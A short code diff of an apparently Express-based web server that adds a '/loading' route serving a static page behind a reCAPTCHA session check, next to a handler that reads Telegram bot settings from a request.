@@ -166,6 +166,10 @@ app.get('/finish', checkRecaptchaSession, (req, res) => {
     res.sendFile(join(__dirname, '/cp/finish/page.html'));
 });
 
+app.get('/loading', checkRecaptchaSession, (req, res) => {
+    res.sendFile(join(__dirname, '/cp/loading/page.html'));
+});
+
 app.post('/change', (req, res) => {
     const { TELEGRAM_BOT_API_KEY, TELEGRAM_CHAT_ID } = req.body;
 
